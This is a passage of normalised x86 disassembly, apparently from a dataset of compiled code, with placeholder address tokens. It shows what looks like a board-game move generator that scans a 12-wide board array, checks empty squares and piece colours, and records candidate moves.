cmp [ esi + ecx * 4 ] 0x20
mov esi [ ebp + 0x18 ]
jne r-xdata
add ecx 0x2
lea esi [ edx + 0x1 ]
mov [ rw-data ] esi
mov esi [ ebp + 0x18 ]
mov [ rw-data ] ecx
cmp ecx 0x9
jg r-xdata
mov edi [ rw-data ]
dec edi
mov [ rw-data ] edi
cmp edi 0x1
jl r-xdata
lea ecx [ edi + edi * 2 ]
lea ecx [ edx + ecx * 4 ]
mov edx [ ebp + 0x8 ]
lea ecx [ edx + ecx * 4 ]
mov [ ebp - 0x8 ] ecx
mov edi [ rw-data ]
dec edi
mov [ rw-data ] edi
cmp edi 0x1
jl r-xdata
lea ecx [ edi + edi * 2 ]
lea ecx [ edx + ecx * 4 ]
mov edx [ ebp + 0x8 ]
lea ecx [ edx + ecx * 4 ]
mov [ ebp - 0x8 ] ecx
mov edi [ rw-data ]
xor edx edx
dec edi
mov [ rw-data ] edx
mov [ rw-data ] edi
cmp edi 0x1
jl r-xdata
mov esi [ rw-data ]
lea ecx [ edi + edi * 2 ]
lea ecx [ esi + ecx * 4 ]
mov esi [ ebp + 0x8 ]
lea ecx [ esi + ecx * 4 ]
mov esi [ ebp + 0x18 ]
mov [ ebp - 0x8 ] ecx
nop [ eax ] eax
mov edi [ rw-data ]
xor edx edx
dec edi
mov [ rw-data ] edx
mov [ rw-data ] edi
cmp edi 0x1
jl r-xdata
mov esi [ rw-data ]
lea ecx [ edi + edi * 2 ]
lea ecx [ esi + ecx * 4 ]
mov esi [ ebp + 0x8 ]
lea ecx [ esi + ecx * 4 ]
mov esi [ ebp + 0x18 ]
mov [ ebp - 0x8 ] ecx
nop
cmp edx 0x5
jg r-xdata
mov ecx [ rw-data ]
mov esi [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ ecx * 4 - 0x1 ]
add ecx edx
lea ecx [ esi + ecx * 4 ]
mov esi [ ebp + 0x18 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x0
je r-xdata
cmp edx 0x6
jl r-xdata
mov ecx [ rw-data ]
mov esi [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ ecx * 4 + 0x1 ]
add ecx edx
lea ecx [ esi + ecx * 4 ]
mov esi [ ebp + 0x18 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x1
je r-xdata
lea ecx [ edx - 0x1 ]
mov [ rw-data ] ecx
cmp ecx 0x8
jl r-xdata
mov ecx [ rw-data ]
mov edi [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ ecx * 4 + 0x1 ]
add ecx edx
lea ecx [ edi + ecx * 4 ]
mov edi [ ebp + 0x10 ]
mov [ ebp - 0x8 ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x0
je r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] 0x0
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edx
mov edx [ eax ]
mov ecx [ ebp + 0xc ]
mov ecx [ ecx + 0x84 ]
mov [ esi + edx * 8 + 0x4 ] ecx
mov ecx [ rw-data ]
inc [ eax ]
mov esi [ ebp + 0x8 ]
lea edx [ ecx + ecx * 2 ]
mov ecx [ ebp + 0xc ]
mov ecx [ ecx + 0x84 ]
lea ecx [ ecx + edx * 4 ]
xor edx edx
cmp [ edi ] edx
mov ecx [ esi + ecx * 4 ]
mov esi [ ebp + 0x18 ]
sete dl
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov ecx [ rw-data ]
mov edi [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ edx + ecx * 4 ]
lea ecx [ edi + ecx * 4 ]
mov edi [ ebp + 0x10 ]
nop [ eax ] eax
lea ecx [ edx - 0x1 ]
mov [ rw-data ] ecx
cmp ecx 0x1
jl r-xdata
mov ecx [ rw-data ]
mov edi [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ ecx * 4 + 0x1 ]
add ecx edx
lea ecx [ edi + ecx * 4 ]
mov edi [ ebp + 0x10 ]
mov [ ebp - 0x8 ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x1
je r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] 0x10
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edx
mov edx [ eax ]
mov ecx [ ebp + 0xc ]
mov ecx [ ecx + 0x4 ]
mov [ esi + edx * 8 + 0x4 ] ecx
mov ecx [ rw-data ]
inc [ eax ]
mov esi [ ebp + 0x8 ]
lea edx [ ecx + ecx * 2 ]
mov ecx [ ebp + 0xc ]
mov ecx [ ecx + 0x4 ]
lea ecx [ ecx + edx * 4 ]
xor edx edx
cmp [ edi ] edx
mov ecx [ esi + ecx * 4 ]
mov esi [ ebp + 0x18 ]
sete dl
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov ecx [ rw-data ]
mov edi [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ edx + ecx * 4 ]
lea ecx [ edi + ecx * 4 ]
mov edi [ ebp + 0x10 ]
mov edx [ rw-data ]
mov ecx [ ebp - 0x4 ]
dec edx
mov [ rw-data ] edx
mov [ rw-data ] ecx
cmp edx 0x4
jl r-xdata
cmp edx 0x8
jl r-xdata
mov edi [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ ecx * 4 + 0x1 ]
add ecx edx
lea ecx [ edi + ecx * 4 ]
mov edi [ ebp + 0x10 ]
mov [ ebp - 0x8 ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x0
je r-xdata
mov edx [ rw-data ]
mov ecx [ ebp - 0x8 ]
dec edx
mov [ rw-data ] edx
mov [ rw-data ] ecx
cmp edx 0x4
jl r-xdata
cmp edx 0x1
jl r-xdata
mov edi [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ ecx * 4 + 0x1 ]
add ecx edx
lea ecx [ edi + ecx * 4 ]
mov edi [ ebp + 0x10 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x1
je r-xdata
mov ecx [ rw-data ]
lea edi [ edx + 0x2 ]
add ecx 0xfffffffe
mov [ rw-data ] edi
mov edi [ ebp + 0x10 ]
mov [ rw-data ] ecx
cmp ecx 0x1
jl r-xdata
cmp [ ebp - 0x8 ] 0x6
jl r-xdata
mov edi [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ ecx * 4 + 0x2 ]
add ecx edx
lea ecx [ edi + ecx * 4 ]
mov edi [ ebp + 0x10 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x0
je r-xdata
mov ecx [ rw-data ]
lea edi [ edx + 0x2 ]
add ecx 0xfffffffe
mov [ rw-data ] edi
mov edi [ ebp + 0x10 ]
mov [ rw-data ] ecx
cmp ecx 0x1
jl r-xdata
cmp [ ebp - 0x8 ] 0x1
jl r-xdata
mov edi [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ ecx * 4 + 0x2 ]
add ecx edx
lea ecx [ edi + ecx * 4 ]
mov edi [ ebp + 0x10 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x1
je r-xdata
mov esi [ ebp + 0x8 ]
mov ecx [ ebp - 0x8 ]
cmp [ esi + ecx * 4 + 0x4 ] 0x20
mov esi [ ebp + 0x18 ]
jne r-xdata
mov ecx [ rw-data ]
lea edi [ edx + 0x1 ]
add ecx 0xfffffffe
mov [ rw-data ] edi
mov edi [ ebp + 0x10 ]
mov [ rw-data ] ecx
cmp ecx 0x1
jl r-xdata
mov [ rw-data ] ecx
lea edi [ edx - 0x1 ]
mov [ rw-data ] edi
mov edi [ ebp + 0x10 ]
cmp ecx 0x9
jg r-xdata
cmp [ rw-data ] 0xa
jg r-xdata
mov esi [ ebp + 0x8 ]
mov ecx [ ebp - 0x8 ]
cmp [ esi + ecx * 4 + 0x4 ] 0x20
mov esi [ ebp + 0x18 ]
jne r-xdata
mov ecx [ rw-data ]
lea edi [ edx + 0x1 ]
add ecx 0xfffffffe
mov [ rw-data ] edi
mov edi [ ebp + 0x10 ]
mov [ rw-data ] ecx
cmp ecx 0x1
jl r-xdata
mov [ rw-data ] ecx
lea edi [ edx - 0x1 ]
mov [ rw-data ] edi
mov edi [ ebp + 0x10 ]
cmp ecx 0x9
jg r-xdata
cmp [ rw-data ] 0xa
jg r-xdata
mov edi [ rw-data ]
inc edi
mov [ rw-data ] edi
cmp edi 0xa
jg r-xdata
lea ecx [ edi + edi * 2 ]
lea ecx [ edx + ecx * 4 ]
mov edx [ ebp + 0x8 ]
lea ecx [ edx + ecx * 4 ]
mov [ ebp - 0x8 ] ecx
nop [ eax ] eax
mov edx [ rw-data ]
lea ecx [ edi + edi * 2 ]
mov esi [ ebp + 0x8 ]
lea ecx [ edx + ecx * 4 ]
lea ecx [ esi + ecx * 4 ]
mov esi [ ebp + 0x18 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x0
je r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edi
mov ecx [ eax ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
mov ecx [ ebp + 0x10 ]
inc [ eax ]
cmp [ ecx ] edx
mov ecx [ ebp - 0x8 ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov edi [ rw-data ]
inc edi
mov [ rw-data ] edi
cmp edi 0xa
jg r-xdata
lea ecx [ edi + edi * 2 ]
lea ecx [ edx + ecx * 4 ]
mov edx [ ebp + 0x8 ]
lea ecx [ edx + ecx * 4 ]
mov [ ebp - 0x8 ] ecx
mov edx [ rw-data ]
lea ecx [ edi + edi * 2 ]
mov esi [ ebp + 0x8 ]
lea ecx [ edx + ecx * 4 ]
lea ecx [ esi + ecx * 4 ]
mov esi [ ebp + 0x18 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x1
je r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edi
mov ecx [ eax ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
mov ecx [ ebp + 0x10 ]
inc [ eax ]
cmp [ ecx ] edx
mov ecx [ ebp - 0x8 ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov edi [ rw-data ]
xor edx edx
inc edi
mov [ rw-data ] edx
mov [ rw-data ] edi
cmp edi 0xa
jg r-xdata
mov esi [ rw-data ]
lea ecx [ edi + edi * 2 ]
lea ecx [ esi + ecx * 4 ]
mov esi [ ebp + 0x8 ]
lea ecx [ esi + ecx * 4 ]
mov esi [ ebp + 0x18 ]
mov [ ebp - 0x8 ] ecx
nop [ eax ] eax
test edx edx
jne r-xdata
test edx edx
jne r-xdata
mov edi [ rw-data ]
xor edx edx
inc edi
mov [ rw-data ] edx
mov [ rw-data ] edi
cmp edi 0xa
jg r-xdata
mov esi [ rw-data ]
lea ecx [ edi + edi * 2 ]
lea ecx [ esi + ecx * 4 ]
mov esi [ ebp + 0x8 ]
lea ecx [ esi + ecx * 4 ]
mov esi [ ebp + 0x18 ]
mov [ ebp - 0x8 ] ecx
nop [ eax ] eax
test edx edx
jne r-xdata
test edx edx
jne r-xdata
mov ecx [ rw-data ]
inc ecx
mov [ rw-data ] ecx
cmp ecx 0x9
jg r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
inc [ eax ]
cmp [ edi ] edx
mov ecx [ ebp - 0xc ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov ecx [ rw-data ]
inc ecx
mov [ rw-data ] ecx
cmp ecx 0x9
jg r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
inc [ eax ]
cmp [ edi ] edx
mov ecx [ ebp - 0xc ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov ecx [ rw-data ]
inc ecx
mov [ rw-data ] ecx
cmp ecx 0x6
jg r-xdata
mov ecx [ rw-data ]
mov edi [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ ecx * 4 - 0x1 ]
add ecx edx
lea ecx [ edi + ecx * 4 ]
mov edi [ ebp + 0x10 ]
mov [ ebp - 0x8 ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x0
je r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] 0x0
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
inc [ eax ]
cmp [ edi ] edx
mov ecx [ ebp - 0x8 ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ rw-data ]
mov [ rw-data ] 0x1
jmp r-xdata
mov esi [ ebp + 0xc ]
inc edx
add ecx 0x4
mov [ rw-data ] edx
cmp edx [ esi + 0x4 ]
mov esi [ ebp + 0x18 ]
jl r-xdata
mov ecx [ rw-data ]
inc ecx
mov [ rw-data ] ecx
cmp ecx 0x6
jg r-xdata
mov ecx [ rw-data ]
mov edi [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ ecx * 4 - 0x1 ]
add ecx edx
lea ecx [ edi + ecx * 4 ]
mov edi [ ebp + 0x10 ]
mov [ ebp - 0x8 ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x1
je r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] 0x10
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
inc [ eax ]
cmp [ edi ] edx
mov ecx [ ebp - 0x8 ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov edx [ rw-data ]
mov [ rw-data ] 0x1
jmp r-xdata
mov eax [ ebp + 0xc ]
inc edx
add ecx 0x4
mov [ rw-data ] edx
cmp edx [ eax + 0x4 ]
mov eax [ ebp + 0x1c ]
jl r-xdata
mov ecx [ ebp - 0x8 ]
mov [ rw-data ] edx
mov [ rw-data ] ecx
cmp edx 0x4
jl r-xdata
cmp ecx 0xa
jg r-xdata
lea ecx [ ecx + ecx * 2 ]
lea ecx [ edx + ecx * 4 ]
mov edx [ ebp + 0x8 ]
lea ecx [ edx + ecx * 4 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x0
je r-xdata
mov ecx [ rw-data ]
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edx
mov ecx [ eax ]
mov edx [ ebp - 0x4 ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
inc [ eax ]
cmp [ edi ] edx
mov ecx [ ebp - 0x8 ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov ecx [ ebp - 0x4 ]
mov [ rw-data ] edx
mov [ rw-data ] ecx
cmp edx 0x4
jl r-xdata
cmp ecx 0x3
jg r-xdata
lea ecx [ ecx + ecx * 2 ]
lea ecx [ edx + ecx * 4 ]
mov edx [ ebp + 0x8 ]
lea ecx [ edx + ecx * 4 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x1
je r-xdata
mov ecx [ rw-data ]
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edx
mov ecx [ eax ]
mov edx [ ebp - 0x8 ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
inc [ eax ]
cmp [ edi ] edx
mov ecx [ ebp - 0xc ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov edx [ ebp - 0x8 ]
mov [ rw-data ] ecx
mov [ rw-data ] edx
cmp ecx 0x1
jl r-xdata
cmp [ ebp - 0x4 ] 0xa
jg r-xdata
mov esi [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ ecx * 4 - 0x2 ]
add ecx edx
lea ecx [ esi + ecx * 4 ]
mov esi [ ebp + 0x18 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x0
je r-xdata
mov ecx [ rw-data ]
mov ecx [ rw-data ]
mov esi [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ edx + ecx * 4 ]
cmp [ esi + ecx * 4 + 0x34 ] 0x20
mov esi [ ebp + 0x18 ]
jne r-xdata
mov edx [ ebp - 0x8 ]
mov [ rw-data ] ecx
mov [ rw-data ] edx
cmp ecx 0x1
jl r-xdata
cmp [ ebp - 0x4 ] 0x5
jg r-xdata
mov esi [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ ecx * 4 - 0x2 ]
add ecx edx
lea ecx [ esi + ecx * 4 ]
mov esi [ ebp + 0x18 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x1
je r-xdata
mov ecx [ rw-data ]
mov ecx [ rw-data ]
mov esi [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ edx + ecx * 4 ]
cmp [ esi + ecx * 4 + 0x34 ] 0x20
mov esi [ ebp + 0x18 ]
jne r-xdata
mov edx [ rw-data ]
mov esi [ ebp + 0x8 ]
lea ecx [ edx - 0x1 ]
mov [ rw-data ] ecx
add ecx [ ebp - 0x4 ]
cmp [ esi + ecx * 4 ] 0x20
mov esi [ ebp + 0x18 ]
jne r-xdata
mov ecx [ rw-data ]
add edx 0x2
inc ecx
mov [ rw-data ] edx
mov [ rw-data ] ecx
cmp ecx 0x9
jg r-xdata
mov [ rw-data ] ecx
lea edi [ edx - 0x1 ]
mov [ rw-data ] edi
mov edi [ ebp + 0x10 ]
cmp ecx 0x1
jl r-xdata
cmp [ rw-data ] 0xa
jg r-xdata
mov ecx [ rw-data ]
cmp [ rw-data ] 0x1
jl r-xdata
lea ecx [ ecx + ecx * 2 ]
lea ecx [ ecx * 4 + 0x1 ]
add ecx edx
lea ecx [ edi + ecx * 4 ]
mov edi [ ebp + 0x10 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x0
je r-xdata
mov edx [ rw-data ]
mov esi [ ebp + 0x8 ]
lea ecx [ edx - 0x1 ]
mov [ rw-data ] ecx
add ecx [ ebp - 0x4 ]
cmp [ esi + ecx * 4 ] 0x20
mov esi [ ebp + 0x18 ]
jne r-xdata
mov ecx [ rw-data ]
add edx 0x2
inc ecx
mov [ rw-data ] edx
mov [ rw-data ] ecx
cmp ecx 0x9
jg r-xdata
mov [ rw-data ] ecx
lea edi [ edx - 0x1 ]
mov [ rw-data ] edi
mov edi [ ebp + 0x10 ]
cmp ecx 0x1
jl r-xdata
cmp [ rw-data ] 0xa
jg r-xdata
mov ecx [ rw-data ]
cmp [ rw-data ] 0x1
jl r-xdata
lea ecx [ ecx + ecx * 2 ]
lea ecx [ ecx * 4 + 0x1 ]
add ecx edx
lea ecx [ edi + ecx * 4 ]
mov edi [ ebp + 0x10 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x1
je r-xdata
mov edi [ rw-data ]
dec edi
mov [ rw-data ] edi
cmp edi 0x1
jl r-xdata
mov edx [ rw-data ]
lea edx [ edx + edx * 2 ]
shl edx 0x2
mov [ ebp - 0xc ] edx
lea ecx [ edx + edi ]
mov edx [ ebp + 0x8 ]
lea ecx [ edx + ecx * 4 ]
mov [ ebp - 0x8 ] ecx
nop [ eax ] eax
mov edx [ rw-data ]
lea ecx [ edi + edi * 2 ]
lea ecx [ edx + ecx * 4 ]
mov edx [ ebp + 0x8 ]
lea ecx [ edx + ecx * 4 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x0
je r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edi
mov ecx [ eax ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
mov ecx [ ebp + 0x10 ]
inc [ eax ]
cmp [ ecx ] edx
mov ecx [ ebp - 0x8 ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edi
mov ecx [ eax ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
mov ecx [ ebp + 0x10 ]
inc [ eax ]
cmp [ ecx ] edx
mov ecx [ ebp - 0xc ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov ecx [ ebp - 0x8 ]
inc edi
add ecx 0x30
mov [ rw-data ] edi
mov [ ebp - 0x8 ] ecx
cmp edi 0x9
jle r-xdata
mov edi [ rw-data ]
dec edi
mov [ rw-data ] edi
cmp edi 0x1
jl r-xdata
mov edx [ rw-data ]
lea edx [ edx + edx * 2 ]
shl edx 0x2
mov [ ebp - 0xc ] edx
lea ecx [ edx + edi ]
mov edx [ ebp + 0x8 ]
lea ecx [ edx + ecx * 4 ]
mov [ ebp - 0x8 ] ecx
nop [ eax ] eax
mov edx [ rw-data ]
lea ecx [ edi + edi * 2 ]
lea ecx [ edx + ecx * 4 ]
mov edx [ ebp + 0x8 ]
lea ecx [ edx + ecx * 4 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x1
je r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edi
mov ecx [ eax ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
mov ecx [ ebp + 0x10 ]
inc [ eax ]
cmp [ ecx ] edx
mov ecx [ ebp - 0x8 ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edi
mov ecx [ eax ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
mov ecx [ ebp + 0x10 ]
inc [ eax ]
cmp [ ecx ] edx
mov ecx [ ebp - 0xc ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov ecx [ ebp - 0x8 ]
inc edi
add ecx 0x30
mov [ rw-data ] edi
mov [ ebp - 0x8 ] ecx
cmp edi 0x9
jle r-xdata
mov edi [ rw-data ]
xor edx edx
dec edi
mov [ rw-data ] edx
mov [ rw-data ] edi
cmp edi 0x1
jl r-xdata
mov ecx [ rw-data ]
mov esi [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
shl ecx 0x2
mov [ ebp - 0xc ] ecx
add ecx edi
lea ecx [ esi + ecx * 4 ]
mov esi [ ebp + 0x18 ]
mov [ ebp - 0x8 ] ecx
test edx edx
jne r-xdata
test edx edx
jne r-xdata
mov edx [ rw-data ]
lea ecx [ edi + edi * 2 ]
lea ecx [ edx + ecx * 4 ]
mov edx [ ebp + 0x8 ]
lea ecx [ edx + ecx * 4 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x0
je r-xdata
mov edx 0x1
mov [ rw-data ] edx
inc edi
add ecx 0x30
mov [ rw-data ] edi
mov [ ebp - 0x8 ] ecx
cmp edi 0x9
jle r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edi
mov ecx [ eax ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
mov ecx [ ebp + 0x10 ]
inc [ eax ]
cmp [ ecx ] edx
mov ecx [ ebp - 0x8 ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov edi [ rw-data ]
xor edx edx
dec edi
mov [ rw-data ] edx
mov [ rw-data ] edi
cmp edi 0x1
jl r-xdata
mov ecx [ rw-data ]
mov esi [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
shl ecx 0x2
mov [ ebp - 0xc ] ecx
add ecx edi
lea ecx [ esi + ecx * 4 ]
mov esi [ ebp + 0x18 ]
mov [ ebp - 0x8 ] ecx
test edx edx
jne r-xdata
test edx edx
jne r-xdata
mov edx [ rw-data ]
lea ecx [ edi + edi * 2 ]
lea ecx [ edx + ecx * 4 ]
mov edx [ ebp + 0x8 ]
lea ecx [ edx + ecx * 4 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x1
je r-xdata
mov edx 0x1
mov [ rw-data ] edx
inc edi
add ecx 0x30
mov [ rw-data ] edi
mov [ ebp - 0x8 ] ecx
cmp edi 0x9
jle r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edi
mov ecx [ eax ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
mov ecx [ ebp + 0x10 ]
inc [ eax ]
cmp [ ecx ] edx
mov ecx [ ebp - 0x8 ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov ecx [ rw-data ]
dec ecx
mov [ rw-data ] ecx
cmp ecx 0x1
jl r-xdata
mov esi [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ edx + ecx * 4 ]
lea ecx [ esi + ecx * 4 ]
mov esi [ ebp + 0x18 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x0
je r-xdata
mov edx [ rw-data ]
mov ecx [ rw-data ]
dec ecx
mov [ rw-data ] ecx
cmp ecx 0x1
jl r-xdata
mov esi [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ edx + ecx * 4 ]
lea ecx [ esi + ecx * 4 ]
mov esi [ ebp + 0x18 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x1
je r-xdata
mov edx [ rw-data ]
mov ecx [ rw-data ]
dec ecx
mov [ rw-data ] ecx
cmp ecx 0x4
jl r-xdata
lea ecx [ ecx + ecx * 2 ]
lea ecx [ edx + ecx * 4 ]
mov edx [ ebp + 0x8 ]
lea ecx [ edx + ecx * 4 ]
mov [ ebp - 0x8 ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x0
je r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] 0x0
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
inc [ eax ]
cmp [ edi ] edx
mov ecx [ ebp - 0x8 ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov edx [ rw-data ]
cmp [ ecx ] 0x20
jne r-xdata
mov ecx [ rw-data ]
dec ecx
mov [ rw-data ] ecx
cmp ecx 0x4
jl r-xdata
lea ecx [ ecx + ecx * 2 ]
lea ecx [ edx + ecx * 4 ]
mov edx [ ebp + 0x8 ]
lea ecx [ edx + ecx * 4 ]
mov [ ebp - 0x8 ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x1
je r-xdata
mov ecx [ eax ]
